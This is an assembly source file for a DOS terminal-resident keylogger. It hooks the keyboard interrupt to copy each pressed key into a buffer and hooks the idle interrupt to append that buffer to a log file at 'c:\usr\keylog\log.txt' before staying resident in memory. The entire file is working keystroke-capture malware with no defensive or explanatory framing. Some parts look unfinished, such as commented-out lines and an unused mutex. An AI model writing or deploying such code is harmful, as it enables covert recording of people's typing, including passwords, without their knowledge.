.186
.model tiny
.code 
org 100h
locals @@

Start:
		cli

	;counting addr of int 9h
		mov bx, 9h * 4h 
		xor ax, ax
		mov es, ax


	;saving addr of old 9h
		mov ax, word ptr es:[bx]  		
		mov word ptr old_9h_o, ax 		;offset
		
		mov ax, word ptr es:[bx + 2]
		mov word ptr old_9h_s, ax  		;segment


	;rewriting addr of old 9h to new 9h in memory
		mov ax, 2509h	
		mov dx, offset new_9h
		int 21h


	;counting addr of int 28h
		mov bx, 28h * 4h 
		xor ax, ax
		mov es, ax

	;saving addr of old 28h
		mov ax, word ptr es:[bx]
		mov word ptr old_28h_o, ax

		mov ax, word ptr es:[bx + 2]
		mov word ptr old_28h_s, ax


	;rewriting addr of old 28h to new 28h in memory
		mov ax, 2528h
		mov dx, offset new_28h
		int 21h
	
		sti

	;staying resident in memory
		mov ax, 3100h;
		mov dx, offset end_label
		shr dx, 4
		inc dx
		int 21h;


new_28h proc
		pusha
		push es ds

		call flush_buff 

		pop ds es
		popa

	;call original int 28h
		pushf
		call dword ptr cs:[old_28h_o]

		iret
		endp

old_28h_o dw 0h
old_28h_s dw 0h


new_9h proc
		pusha
		push es ds

	;call original int 9h
		pushf
		call dword ptr cs:[old_9h_o]

		call read_to_buff	
		
		pop ds es
		popa

		iret
		endp
		

old_9h_o dw 0h
old_9h_s dw 0h

		

read_to_buff proc 
	
		push ds
		push cs
		pop ds

	;saving pressed key
		mov ah, 01h	
		int 16h

		jz @@exit

	;setting bx as len 
		mov bl, tail_ind 
		xor bh, bh

	;saving key to buff
		mov buff[bx], al
		inc tail_ind 


@@exit:

		pop ds

		ret
		endp


flush_buff proc 


		push ds
		push cs
		pop ds
		
		mov cl, cs:tail_ind
		xor ch, ch

		;cmp head_ind, cl
		;je @@exit
	
		push cx

		;mov cl, tail_ind
	;opening file by adress in ds:dx and saving its handler  
		mov ax, 3d01h; 
		mov dx, offset log_file;
		int 21h
		mov file_handler, ax


	;moving cursor to the end of file
		mov ax, 4202h
		mov bx, file_handler
		xor cx, cx
		xor dx, dx
		int 21h

;!!! 
		mov al, head_ind
		xor ah, ah
		mov dx, offset buff
		add dx, ax

		pop cx
	;writing to file
		mov ah, 40h
		mov bx, file_handler
		sub cl, head_ind
		xor ch, ch
;		mov dx, offset buff
;		add dx, head_ind
		int 21h
		
		add cl, head_ind
		xor ch, ch
		mov head_ind, cl

	;closing file
		mov ah, 3eh
		mov bx, file_handler
		int 21h

@@exit:
		pop ds
		ret
		endp


log_file db 'c:\usr\keylog\log.txt', 0
file_handler dw ?

head_ind db 0d
mutex db 0
tail_ind db 0d

buff db 256d dup (0h)




end_label:
end Start
